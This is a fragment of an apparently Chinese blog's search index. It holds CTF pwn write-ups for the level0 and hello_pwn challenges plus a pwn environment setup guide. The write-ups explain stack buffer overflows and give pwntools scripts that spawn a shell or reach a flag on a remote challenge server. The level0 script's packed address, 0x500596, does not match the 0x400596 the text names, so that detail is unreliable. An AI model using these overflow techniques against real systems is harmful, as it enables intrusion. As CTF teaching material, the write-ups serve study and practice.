World\\n&quot;, 0xDuLL); return vulnerable_function(1LL, &quot;Hello, World\\n&quot;); } 双击vulnerable_function()函数，看到如下代码： ssize_t vulnerable_function() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x200uLL); } 这里的rbp是栈基地址寄存器，保存的是当前的栈底地址为0x80，但是可输入的大小为0x200。 双击&amp;buf看到返回地址： 返回地址可以覆盖成callsystem()，地址为0x400596，可命令执行： int callsystem() { return system(&quot;/bin/sh&quot;); } 最终脚本如下： from pwn import * p = remote('111.200.241.244',63770) payload = 'a'*0x80+'a'*0x8+p64(0x500596) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/"},{"title":"[攻防世界]hello_pwn","content":"checksec检查程序保护机制： checksec可以检查程序保护机制，从而查看题目开启了哪些保护机制，有助于对题目的初步分析。 Arch：程序位数(查看是多少位的程序，比如32或64位)，也可以查看是哪个微处理器，比如i386为32位微处理器，amd64为64位微处理器(x86架构的延伸产品，称为x86-64，后改名为AMD64)； RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT(Global Offset Table)攻击。RELEO为&quot;Partial RELRO&quot;，说明我们对GOT表有写权限。 Stack：栈溢出监测，查看程序是否开启了Canary防护(一种对函数栈的监测保护：还没等到栈溢出，先返回canary word，从而监测栈溢出情况)。 NX ：No-eXecute(不可执行)，相等于windows的DEP(数据执行保护)，就是将攻击者构造的payload和shellcode(一般为系统远程执行命令)所在的内存页标识为不可执行，当攻击代码想要以数据代码伪装成可执行代码时，就会被检测到，从而使CPU抛出异常，从而不执行恶意指令。 PIE：内存地址空间分布随机化(ASLR:address space layout randomization) 根据图片结果可以得知，该题是一个64位的程序，没有开启RELRO，没有开启栈溢出检测，开启了NX，没有开启内存地址空间分布随机化。 把题目文件拖进IDA中查看伪代码： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { alarm(0x3Cu); setbuf(stdout, 0LL); puts(&quot;~~ welcome to ctf ~~ &quot;); puts(&quot;lets get helloworld for bof&quot;); read(0, &amp;unk_601068, 0x10uLL); if ( dword_60106C == 1853186401 ) sub_400686(); return 0LL; } alarm(0x3Cu);：alarm()中的参数0x3Cu是十六进制无符号数，即十进制对应60，所以该函数的作用是在程序运行60秒后，给进程发送SIGALRM信号，如果不另编写程序接受处理此信号，则默认结束此程序。 setbuf(stdout, 0LL);：是重置输出流，要么在网络传输中会传不出去。（本地加不加没区别 read(0, &amp;unk_601068, 0x10uLL);：read()可以读取数据，第一个参数为0，代表标准输入，第三个参数是输入的个数是0x10，即16个字节。就是从0x601068开始往后读取16个字节。 sub_400686()直接可以查看flag.txt文件： __int64 sub_400686() { system(&quot;cat flag.txt&quot;); return 0LL; } 所以要想拿到flag，必须要让dword_60106C == 1853186401。 因为能够利用unk_601068的读取数据，所以可以让数据溢出到dword_60106C，给dword_60106C赋值为0x6e756161，即可得到flag。 0x601068-0x60106c=0x4，看图也能看出来，缓冲区地址和目标地址之间的内存空间大小0x4。向其中填满脏数据即可。 from pwn import * p = remote('111.200.241.244', 64306) payload=0x4*'c'+p64(1853186401) #p64就是将一个数字转换为字符。 p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/"},{"title":"PWN环境搭建","content":"参考文档：https://github.com/leungbless/pwnVM-ovf 0x00 环境 操作系统：Ubuntu 16.04 0x01 更换源 cd ~ &amp;&amp; mkdir .pip cd ~/.pip &amp;&amp; touch pip.conf sudo gedit pip.conf 然后写入以下内容： [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=mirrors.aliyun.com sudo apt-get update sudo apt-get upgrade 0x02 安装 git，gdb 和 gdb-multiarch，同时安装 binfmt 用来识别文件类型 sudo apt-get update sudo apt-get install git gdb gdb-multiarch sudo apt-get install &quot;binfmt*&quot; 0x03 安装gdb的插件pwndbg git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 0x04 安装PwnTools sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential pip install -U setuptools pip install --upgrade pip pip install --upgrade pwntools 这里如果出现报错，尝试： wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python get-pip.py pip install --upgrade pwntools 0X05 安装ssh sudo apt-get install ssh 0x06 安装ROPgadget工具 pip install ropgadget 0x07 安装qemu sudo apt-get install qemu-user 0x08 安装LibcSearcher(用处: 用来泄露libc库中函数的偏移的库) git clone https://github.com.cnpmjs.org/lieanu/LibcSearcher.git cd LibcSearcher sudo python setup.py develop 0x09 安装32位程序依赖的环境 sudo dpkg --add-architecture i386 sudo apt-get -y install lib32z1 lib32ncurses5 ","link":"https://shawr00t.github.io/pwn-huan-jing-da-jian/"}]}